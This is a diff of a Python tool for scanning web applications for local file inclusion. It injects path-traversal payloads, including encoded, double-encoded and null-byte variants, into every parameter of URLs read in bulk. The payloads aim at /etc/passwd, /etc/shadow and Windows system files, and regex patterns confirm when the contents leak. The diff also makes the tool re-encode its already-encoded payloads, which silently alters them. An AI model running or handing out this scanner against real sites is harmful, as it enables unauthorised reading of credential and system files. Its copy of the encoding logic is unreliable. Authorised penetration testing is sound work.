@@ -7,6 +7,8 @@ import re
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from colorama import init, Fore, Style
+from tqdm import tqdm
+import sys
 
 # Initialize colorama for colored console output
 init(autoreset=True)
@@ -19,7 +21,7 @@ requests.packages.urllib3.disable_warnings(
 # Setup logging to capture detailed scan information and errors
 logging.basicConfig(
     filename='lfi_scanner.log',
-    level=logging.DEBUG,  # Set to DEBUG for detailed logs
+    level=logging.INFO,  # Set to INFO for general logs, DEBUG for detailed logs
     format='%(asctime)s - %(levelname)s - %(message)s'
 )
 
@@ -27,93 +29,56 @@ logging.basicConfig(
 PAYLOAD_KEYWORDS = [
     # /etc/passwd payloads with enhanced regex patterns
     ("../../../../../../../../../../../../etc/passwd", [
-        r"root:x:0:0:root:/root:/bin/bash",
-        r"root:x:0:0:root:/root:/bin/sh",
-        r"root:x:0:0:root:/root:/bin/false",
-        r"root:x:0:0:root:/root:/usr/bin/nologin",
-        r"root:x:0:0:root:/root:/bin/dash",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/bash",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/sh",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/false",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/usr/bin/nologin",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/dash"
+        r"root:.*:0:0:",
+        r"bin:.*:1:1:",
+        r"daemon:.*:1:1:",
+        r"\/bin\/bash",
+        r"\/bin\/sh",
+        r"\/usr\/bin\/nologin",
+        r"\/sbin\/nologin",
     ]),
-    ("%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", [
-        r"root:x:0:0:root:/root:/bin/bash",
-        r"root:x:0:0:root:/root:/bin/sh",
-        r"root:x:0:0:root:/root:/bin/false",
-        r"root:x:0:0:root:/root:/usr/bin/nologin",
-        r"root:x:0:0:root:/root:/bin/dash",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/bash",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/sh",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/false",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/usr/bin/nologin",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/dash"
+    ("%2e%2e%2f" * 10 + "etc%2fpasswd", [
+        r"root:.*:0:0:",
+        r"bin:.*:1:1:",
+        r"daemon:.*:1:1:",
+        r"\/bin\/bash",
+        r"\/bin\/sh",
+        r"\/usr\/bin\/nologin",
+        r"\/sbin\/nologin",
     ]),
+    ("..%2F" * 10 + "etc%2Fpasswd", [
+        r"root:.*:0:0:",
+        r"bin:.*:1:1:",
+        r"daemon:.*:1:1:",
+        r"\/bin\/bash",
+        r"\/bin\/sh",
+        r"\/usr\/bin\/nologin",
+        r"\/sbin\/nologin",
+    ]),
+    ("..%2F" * 10 + "etc%2Fshadow", [
+        r"root:[x*]!?:[0-9]*:",
+        r"daemon:[x*]!?:[0-9]*:",
+        r"bin:[x*]!?:[0-9]*:",
+    ]),
+    # Windows equivalent payloads
+    ("../../../../../../../../../../../../Windows/System32/drivers/etc/hosts", [
+        r"127\.0\.0\.1\s+localhost",
+        r"::1\s+localhost",
+    ]),
+    ("../../../../../../../../../../../../Windows/System32/win.ini", [
+        r"\[fonts\]",
+        r"\[extensions\]",
+        r"\[mci extensions\]",
+        r"\[files\]",
+        r"\[Mail\]",
+    ]),
+    # Null byte injection
     ("../../../../../../../../../../../../etc/passwd%00", [
-        r"root:x:0:0:root:/root:/bin/bash",
-        r"root:x:0:0:root:/root:/bin/sh",
-        r"root:x:0:0:root:/root:/bin/false",
-        r"root:x:0:0:root:/root:/usr/bin/nologin",
-        r"root:x:0:0:root:/root:/bin/dash",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/bash",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/sh",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/false",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/usr/bin/nologin",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/dash"
+        r"root:.*:0:0:",
     ]),
-    ("..../..//..../..//..../..//..//etc/passwd", [
-        r"root:x:0:0:root:/root:/bin/bash",
-        r"root:x:0:0:root:/root:/bin/sh",
-        r"root:x:0:0:root:/root:/bin/false",
-        r"root:x:0:0:root:/root:/usr/bin/nologin",
-        r"root:x:0:0:root:/root:/bin/dash",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/bash",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/sh",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/false",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/usr/bin/nologin",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/dash"
-    ]),
-    ("../../../../../../../../../../../../eTc/PaSsWd", [
-        r"root:x:0:0:root:/root:/bin/bash",
-        r"root:x:0:0:root:/root:/bin/sh",
-        r"root:x:0:0:root:/root:/bin/false",
-        r"root:x:0:0:root:/root:/usr/bin/nologin",
-        r"root:x:0:0:root:/root:/bin/dash",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/bash",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/sh",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/false",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/usr/bin/nologin",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/dash"
-    ]),
-    ("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64", [
-        r"root:x:0:0:root:/root:/bin/bash",
-        r"root:x:0:0:root:/root:/bin/sh",
-        r"root:x:0:0:root:/root:/bin/false",
-        r"root:x:0:0:root:/root:/usr/bin/nologin",
-        r"root:x:0:0:root:/root:/bin/dash",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/bash",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/sh",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/false",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/usr/bin/nologin",
-        r"[a-zA-Z0-9_-]+:x:\d+:\d+:.*:/.*:/bin/dash"
-    ]),
-
-    # /etc/shadow payloads
-    ("../../../../../../../../../../../../etc/shadow", [
-        r"^\w+:\$[0-9]+\$[A-Za-z0-9./]+\$[A-Za-z0-9./]+:",
-        r"^\w+:[\*\!]:\d+:\d+:\d+:\d+:\d*:\d*:\d*$",
-        r"^\w+:[\$\*\!][^:]*:\d+:\d+:\d+:\d+:\d*:\d*:\d*$"
-    ]),
-    ("%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fshadow", [
-        r"^\w+:\$[0-9]+\$[A-Za-z0-9./]+\$[A-Za-z0-9./]+:",
-        r"^\w+:[\*\!]:\d+:\d+:\d+:\d+:\d*:\d*:\d*$",
-        r"^\w+:[\$\*\!][^:]*:\d+:\d+:\d+:\d+:\d*:\d*:\d*$"
-    ]),
-    ("..../..//..../..//..../..//..//etc/shadow", [
-        r"^\w+:\$[0-9]+\$[A-Za-z0-9./]+\$[A-Za-z0-9./]+:",
-        r"^\w+:[\*\!]:\d+:\d+:\d+:\d+:\d*:\d*:\d*$",
-        r"^\w+:[\$\*\!][^:]*:\d+:\d+:\d+:\d+:\d*:\d*:\d*$"
+    # Double encoding
+    ("%252e%252e%252f" * 10 + "etc%252fpasswd", [
+        r"root:.*:0:0:",
     ]),
 ]
 
@@ -154,9 +119,9 @@ def identify_parameters(url):
 
 def construct_url(base_url, params):
     """
-    Construct URL with updated parameters without re-encoding already-encoded payloads.
+    Construct URL with updated parameters.
     """
-    query = '&'.join([f"{k}={v}" for k, v in params.items()])
+    query = urlencode(params, doseq=True)
     return f"{base_url}?{query}"
 
 def send_request(url, headers=None):
@@ -180,8 +145,7 @@ def analyze_response(response, compiled_patterns):
     if response and response.status_code in [200, 302, 403, 404]:
         for pattern in compiled_patterns:
             try:
-                match = pattern.search(response.text)
-                if match:
+                if pattern.search(response.text):
                     logging.debug(f"Keyword pattern '{pattern.pattern}' matched.")
                     return True
             except re.error as regex_error:
@@ -195,14 +159,13 @@ def process_url(url, verbose=False):
     """
     vulnerable = []
     base_url, params = identify_parameters(url)
-    
+
     if not params:
         logging.info(f"No parameters found in URL: {url}")
         return vulnerable
-    
+
     for param in params:
         injected_params = params.copy()
-        # No longer setting payload_success here to ensure all parameters are tested
         for payload, keyword_patterns in PAYLOAD_KEYWORDS:
             if not keyword_patterns:
                 continue  # Skip if no valid regex patterns
@@ -211,67 +174,71 @@ def process_url(url, verbose=False):
             injected_url = construct_url(base_url, injected_params)
             logging.info(f"Testing payload: {payload} on URL: {injected_url} (Parameter: {param})")
             response = send_request(injected_url)
-            
+
             if analyze_response(response, keyword_patterns):
                 logging.info(f"VULNERABLE: {injected_url} | Parameter: {param} | Payload: {payload}")
-                print(f"{Fore.GREEN}[+] Vulnerable: {injected_url} | Parameter: {param} | Payload: {payload}{Style.RESET_ALL}")
+                result = f"[+] Vulnerable: {injected_url} | Parameter: {param} | Payload: {payload}"
+                print(Fore.GREEN + result + Style.RESET_ALL)
                 if verbose and response:
                     # Optionally print a snippet of the response for manual verification
                     snippet = response.text[:500] + ('...' if len(response.text) > 500 else '')
                     print(f"{Fore.YELLOW}Response Snippet:{Style.RESET_ALL}\n{snippet}\n{'-'*80}")
                 vulnerable.append((injected_url, param, payload))
-                # Continue testing other payloads and parameters even after finding a vulnerability
+                # Optionally, break after finding the first vulnerability per parameter
+                # break
             else:
-                print(f"{Fore.RED}[-] Not Vulnerable: {injected_url} | Parameter: {param} | Payload: {payload}{Style.RESET_ALL}")
-                if verbose and response:
-                    # Optionally print response snippet for non-vulnerable attempts
-                    snippet = response.text[:500] + ('...' if len(response.text) > 500 else '')
-                    print(f"{Fore.YELLOW}Response Snippet:{Style.RESET_ALL}\n{snippet}\n{'-'*80}")
-    
+                if verbose:
+                    result = f"[-] Not Vulnerable: {injected_url} | Parameter: {param} | Payload: {payload}"
+                    print(Fore.RED + result + Style.RESET_ALL)
     return vulnerable
 
 def main():
     # Argument parsing
-    parser = argparse.ArgumentParser(description='Automated LFI Scanner for /etc/passwd and /etc/shadow')
+    parser = argparse.ArgumentParser(description='Automated LFI Scanner for common files')
     parser.add_argument('-i', '--input', required=True, help='Input file with URLs (one per line)')
     parser.add_argument('-o', '--output', required=True, help='Output file for vulnerable URLs')
     parser.add_argument('-t', '--threads', type=int, default=10, help='Number of concurrent threads (default: 10)')
     parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output with response snippets')
     args = parser.parse_args()
-    
+
     # Read URLs from input file
     urls = read_urls(args.input)
     if not urls:
         print("No URLs to process. Please check the input file.")
-        return
-    
+        sys.exit(1)
+
     # Open output file for writing vulnerable URLs
     try:
         with open(args.output, 'w') as output_file:
             output_file.write("Full URL | Parameter | Payload\n")
             logging.info(f"Opened output file: {args.output}")
-            
+
             # Start scanning with ThreadPoolExecutor
             with ThreadPoolExecutor(max_workers=args.threads) as executor:
                 # Submit all URLs to the executor
                 futures = {executor.submit(process_url, url, args.verbose): url for url in urls}
-                
-                for future in as_completed(futures):
-                    url = futures[future]
-                    try:
-                        vulnerable = future.result()
-                        if vulnerable:
-                            for vuln_url, param, payload in vulnerable:
-                                output_file.write(f"{vuln_url} | {param} | {payload}\n")
-                    except Exception as e:
-                        logging.error(f"Error processing URL {url}: {e}")
-                        print(f"{Fore.RED}Error processing URL {url}. Check log for details.{Style.RESET_ALL}")
-        
-        print(f"\nScan complete. Vulnerable URLs saved to {args.output}")
+
+                # Use tqdm progress bar
+                with tqdm(total=len(futures), desc="Scanning URLs", unit="url") as pbar:
+                    for future in as_completed(futures):
+                        url = futures[future]
+                        try:
+                            vulnerable = future.result()
+                            if vulnerable:
+                                for vuln_url, param, payload in vulnerable:
+                                    output_file.write(f"{vuln_url} | {param} | {payload}\n")
+                            pbar.update(1)
+                        except Exception as e:
+                            logging.error(f"Error processing URL {url}: {e}")
+                            print(f"{Fore.RED}Error processing URL {url}. Check log for details.{Style.RESET_ALL}")
+                            pbar.update(1)
+
+        print(f"\n{Fore.CYAN}Scan complete. Vulnerable URLs saved to {args.output}{Style.RESET_ALL}")
         logging.info("Scanning completed.")
     except Exception as e:
         logging.error(f"Failed to open output file {args.output}: {e}")
-        print(f"Failed to open output file {args.output}. Check log for details.")
+        print(f"{Fore.RED}Failed to open output file {args.output}. Check log for details.{Style.RESET_ALL}")
+        sys.exit(1)
 
 if __name__ == "__main__":
     main()
